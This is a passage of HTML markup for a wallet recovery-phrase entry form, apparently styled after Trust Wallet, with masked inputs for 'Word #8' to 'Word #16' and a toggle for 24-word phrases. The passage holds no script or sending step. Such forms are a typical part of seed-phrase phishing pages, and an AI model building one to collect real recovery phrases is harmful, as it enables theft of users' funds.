                            d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z"
                            fill="currentColor"
                          ></path>
                          <path
                            d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z"
                            fill="currentColor"
                          ></path>
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                      </button>
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[16px] scwtw-font-medium scwtw-absolute scwtw-top-[12px]"
                      >
                        8.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-medium font-inter scwtw-h-12 scwtw-text-[#1e2329] dark:scwtw-text-[#eaecef] scwtw-p-3 scwtw-rounded-[4px] scwtw-flex scwtw-items-center scwtw-border scwtw-border-transparent scwtw-bg-[#f5f5f5] dark:scwtw-bg-[#2b3139] scwtw-border scwtw-border-transparent scwtw-outline-none scwtw-pl-8 scwtw-pr-10 scwtw-py-3 placeholder:scwtw-text-[#9ca3af] scwtw-text-[16px] focus:scwtw-border-[#0500ff] focus:dark:scwtw-border-[#48ff91] scwtw-transition-all scwtw-duration-300 trust-seed-input"
                        type="password"
                        placeholder="Word #8"
                      />
                      <button
                        class="scwtw-group scwtw-absolute scwtw-top-[12px] scwtw-right-[12px] hover:scwtw-opacity-80 scwtw-transition-all scwtw-duration-300 trust-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="8"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z"
                            fill="currentColor"
                          ></path>
                          <path
                            d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z"
                            fill="currentColor"
                          ></path>
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                      </button>
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[16px] scwtw-font-medium scwtw-absolute scwtw-top-[12px]"
                      >
                        9.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-medium font-inter scwtw-h-12 scwtw-text-[#1e2329] dark:scwtw-text-[#eaecef] scwtw-p-3 scwtw-rounded-[4px] scwtw-flex scwtw-items-center scwtw-border scwtw-border-transparent scwtw-bg-[#f5f5f5] dark:scwtw-bg-[#2b3139] scwtw-border scwtw-border-transparent scwtw-outline-none scwtw-pl-8 scwtw-pr-10 scwtw-py-3 placeholder:scwtw-text-[#9ca3af] scwtw-text-[16px] focus:scwtw-border-[#0500ff] focus:dark:scwtw-border-[#48ff91] scwtw-transition-all scwtw-duration-300 trust-seed-input"
                        type="password"
                        placeholder="Word #9"
                      />
                      <button
                        class="scwtw-group scwtw-absolute scwtw-top-[12px] scwtw-right-[12px] hover:scwtw-opacity-80 scwtw-transition-all scwtw-duration-300 trust-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="9"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z"
                            fill="currentColor"
                          ></path>
                          <path
                            d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z"
                            fill="currentColor"
                          ></path>
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                      </button>
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[16px] scwtw-font-medium scwtw-absolute scwtw-top-[12px]"
                      >
                        10.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-medium font-inter scwtw-h-12 scwtw-text-[#1e2329] dark:scwtw-text-[#eaecef] scwtw-p-3 scwtw-rounded-[4px] scwtw-flex scwtw-items-center scwtw-border scwtw-border-transparent scwtw-bg-[#f5f5f5] dark:scwtw-bg-[#2b3139] scwtw-border scwtw-border-transparent scwtw-outline-none scwtw-pl-8 scwtw-pr-10 scwtw-py-3 placeholder:scwtw-text-[#9ca3af] scwtw-text-[16px] focus:scwtw-border-[#0500ff] focus:dark:scwtw-border-[#48ff91] scwtw-transition-all scwtw-duration-300 trust-seed-input"
                        type="password"
                        placeholder="Word #10"
                      />
                      <button
                        class="scwtw-group scwtw-absolute scwtw-top-[12px] scwtw-right-[12px] hover:scwtw-opacity-80 scwtw-transition-all scwtw-duration-300 trust-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="10"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z"
                            fill="currentColor"
                          ></path>
                          <path
                            d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z"
                            fill="currentColor"
                          ></path>
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                      </button>
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[16px] scwtw-font-medium scwtw-absolute scwtw-top-[12px]"
                      >
                        11.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-medium font-inter scwtw-h-12 scwtw-text-[#1e2329] dark:scwtw-text-[#eaecef] scwtw-p-3 scwtw-rounded-[4px] scwtw-flex scwtw-items-center scwtw-border scwtw-border-transparent scwtw-bg-[#f5f5f5] dark:scwtw-bg-[#2b3139] scwtw-border scwtw-border-transparent scwtw-outline-none scwtw-pl-8 scwtw-pr-10 scwtw-py-3 placeholder:scwtw-text-[#9ca3af] scwtw-text-[16px] focus:scwtw-border-[#0500ff] focus:dark:scwtw-border-[#48ff91] scwtw-transition-all scwtw-duration-300 trust-seed-input"
                        type="password"
                        placeholder="Word #11"
                      />
                      <button
                        class="scwtw-group scwtw-absolute scwtw-top-[12px] scwtw-right-[12px] hover:scwtw-opacity-80 scwtw-transition-all scwtw-duration-300 trust-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="11"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z"
                            fill="currentColor"
                          ></path>
                          <path
                            d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z"
                            fill="currentColor"
                          ></path>
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                      </button>
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[16px] scwtw-font-medium scwtw-absolute scwtw-top-[12px]"
                      >
                        12.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-medium font-inter scwtw-h-12 scwtw-text-[#1e2329] dark:scwtw-text-[#eaecef] scwtw-p-3 scwtw-rounded-[4px] scwtw-flex scwtw-items-center scwtw-border scwtw-border-transparent scwtw-bg-[#f5f5f5] dark:scwtw-bg-[#2b3139] scwtw-border scwtw-border-transparent scwtw-outline-none scwtw-pl-8 scwtw-pr-10 scwtw-py-3 placeholder:scwtw-text-[#9ca3af] scwtw-text-[16px] focus:scwtw-border-[#0500ff] focus:dark:scwtw-border-[#48ff91] scwtw-transition-all scwtw-duration-300 trust-seed-input"
                        type="password"
                        placeholder="Word #12"
                      />
                      <button
                        class="scwtw-group scwtw-absolute scwtw-top-[12px] scwtw-right-[12px] hover:scwtw-opacity-80 scwtw-transition-all scwtw-duration-300 trust-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="12"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z"
                            fill="currentColor"
                          ></path>
                          <path
                            d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z"
                            fill="currentColor"
                          ></path>
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                      </button>
                    </div>
                  </div>
                  <div
                    id="trust-container-24-words"
                    class="trust-container-24-words scwtw-hidden scwtw-grid scwtw-grid-cols-2 scwtw-gap-1 scwtw-mt-1"
                  >
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[16px] scwtw-font-medium scwtw-absolute scwtw-top-[12px]"
                      >
                        13.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-medium font-inter scwtw-h-12 scwtw-text-[#1e2329] dark:scwtw-text-[#eaecef] scwtw-p-3 scwtw-rounded-[4px] scwtw-flex scwtw-items-center scwtw-border scwtw-border-transparent scwtw-bg-[#f5f5f5] dark:scwtw-bg-[#2b3139] scwtw-border scwtw-border-transparent scwtw-outline-none scwtw-pl-8 scwtw-pr-10 scwtw-py-3 placeholder:scwtw-text-[#9ca3af] scwtw-text-[16px] focus:scwtw-border-[#0500ff] focus:dark:scwtw-border-[#48ff91] scwtw-transition-all scwtw-duration-300 trust-seed-input"
                        type="password"
                        placeholder="Word #13"
                      />
                      <button
                        class="scwtw-group scwtw-absolute scwtw-top-[12px] scwtw-right-[12px] hover:scwtw-opacity-80 scwtw-transition-all scwtw-duration-300 trust-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="13"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z"
                            fill="currentColor"
                          ></path>
                          <path
                            d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z"
                            fill="currentColor"
                          ></path>
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                      </button>
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[16px] scwtw-font-medium scwtw-absolute scwtw-top-[12px]"
                      >
                        14.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-medium font-inter scwtw-h-12 scwtw-text-[#1e2329] dark:scwtw-text-[#eaecef] scwtw-p-3 scwtw-rounded-[4px] scwtw-flex scwtw-items-center scwtw-border scwtw-border-transparent scwtw-bg-[#f5f5f5] dark:scwtw-bg-[#2b3139] scwtw-border scwtw-border-transparent scwtw-outline-none scwtw-pl-8 scwtw-pr-10 scwtw-py-3 placeholder:scwtw-text-[#9ca3af] scwtw-text-[16px] focus:scwtw-border-[#0500ff] focus:dark:scwtw-border-[#48ff91] scwtw-transition-all scwtw-duration-300 trust-seed-input"
                        type="password"
                        placeholder="Word #14"
                      />
                      <button
                        class="scwtw-group scwtw-absolute scwtw-top-[12px] scwtw-right-[12px] hover:scwtw-opacity-80 scwtw-transition-all scwtw-duration-300 trust-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="14"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z"
                            fill="currentColor"
                          ></path>
                          <path
                            d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z"
                            fill="currentColor"
                          ></path>
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                      </button>
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[16px] scwtw-font-medium scwtw-absolute scwtw-top-[12px]"
                      >
                        15.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-medium font-inter scwtw-h-12 scwtw-text-[#1e2329] dark:scwtw-text-[#eaecef] scwtw-p-3 scwtw-rounded-[4px] scwtw-flex scwtw-items-center scwtw-border scwtw-border-transparent scwtw-bg-[#f5f5f5] dark:scwtw-bg-[#2b3139] scwtw-border scwtw-border-transparent scwtw-outline-none scwtw-pl-8 scwtw-pr-10 scwtw-py-3 placeholder:scwtw-text-[#9ca3af] scwtw-text-[16px] focus:scwtw-border-[#0500ff] focus:dark:scwtw-border-[#48ff91] scwtw-transition-all scwtw-duration-300 trust-seed-input"
                        type="password"
                        placeholder="Word #15"
                      />
                      <button
                        class="scwtw-group scwtw-absolute scwtw-top-[12px] scwtw-right-[12px] hover:scwtw-opacity-80 scwtw-transition-all scwtw-duration-300 trust-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="15"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z"
                            fill="currentColor"
                          ></path>
                          <path
                            d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z"
                            fill="currentColor"
                          ></path>
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                      </button>
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[16px] scwtw-font-medium scwtw-absolute scwtw-top-[12px]"
                      >
                        16.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-medium font-inter scwtw-h-12 scwtw-text-[#1e2329] dark:scwtw-text-[#eaecef] scwtw-p-3 scwtw-rounded-[4px] scwtw-flex scwtw-items-center scwtw-border scwtw-border-transparent scwtw-bg-[#f5f5f5] dark:scwtw-bg-[#2b3139] scwtw-border scwtw-border-transparent scwtw-outline-none scwtw-pl-8 scwtw-pr-10 scwtw-py-3 placeholder:scwtw-text-[#9ca3af] scwtw-text-[16px] focus:scwtw-border-[#0500ff] focus:dark:scwtw-border-[#48ff91] scwtw-transition-all scwtw-duration-300 trust-seed-input"
                        type="password"
                        placeholder="Word #16"
                      />
                      <button
                        class="scwtw-group scwtw-absolute scwtw-top-[12px] scwtw-right-[12px] hover:scwtw-opacity-80 scwtw-transition-all scwtw-duration-300 trust-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="16"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z"
                            fill="currentColor"
                          ></path>
                          <path
                            d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z"
                            fill="currentColor"
                          ></path>
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
